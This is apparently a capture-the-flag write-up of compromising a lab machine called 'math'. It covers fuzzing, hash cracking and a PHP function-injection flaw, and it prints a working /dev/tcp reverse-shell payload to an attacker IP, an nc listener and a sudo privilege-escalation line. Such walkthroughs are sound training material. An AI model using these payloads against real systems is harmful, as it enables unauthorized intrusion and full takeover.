### Port Scanning

`nmap -sV -sC -p- -v $IP --open -T 5`

![math](/static/images/math-writeup-images/image.png)

Only ports 22 (SSH) and 80 (HTTP) are open.

---

## Enumeration

`http://172.16.1.79`

![math 1](/static/images/math-writeup-images/image1.png)

I tested SQL Injection and default credentials on this login page, but without success.

### Fuzzing

```
ffuf -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt -u http://172.16.1.79/FUZZ -e .php .txt .log .zip .py -ic
```

![math 2](/static/images/math-writeup-images/image2.png)

File `backup.zip` was found.

![math 3](/static/images/math-writeup-images/image3.png)

After downloading it, we can see it contains the source code of the application.

Hardcoded hash found inside the source code.

![math 4](/static/images/math-writeup-images/image4.png)

I used John the Ripper to crack the hash.

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![math 5](/static/images/math-writeup-images/image5.png)

Credencial `f4:1q2we`

With that, we can log into the application.

The application is a website under development meant to help students solve math operations.

### Code Review

![math 7](/static/images/math-writeup-images/image7.png)

If the `page` parameter is set and the value is `math`, we are redirected to `/math.php`.

Analyzing the `math.php` file, we can see we have control over the math operations that the application performs.

![math 8](/static/images/math-writeup-images/image8.png)

### Function Injection

Knowing we control the parameters and the application lacks sanitization, we can exploit the function like this:

`/math.php?operation=system&firstNum=id&secondNum=1`

![math 9](/static/images/math-writeup-images/image9.png)

---

## Foot Hold

`/math.php?operation=system&firstNum=bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'&secondNum=1`

Note: Don’t forget to encode the payload.

![math 10](/static/images/math-writeup-images/image10.png)

`nc -lnvp 1337`

![math 11](/static/images/math-writeup-images/image11.png)

## Privillege Escalation

Inside the `/home/f4` directory, we can see a note revealing his password.

![math 13](/static/images/math-writeup-images/image13.png)

![math 14](/static/images/math-writeup-images/image14.png)

`sudo -l`

![math 15](/static/images/math-writeup-images/image15.png)

We can see the user is allowed to run the `verify.py` script as root without a password.

`cat verify.py`

![math 16](/static/images/math-writeup-images/image16.png)

Basically, the script reads a file and checks if it exists.

Knowing this, we’ll make it read the `/bin/bash` file, which will grant us root privileges on the machine.

```python
__import__('os').system('/bin/bash')
```
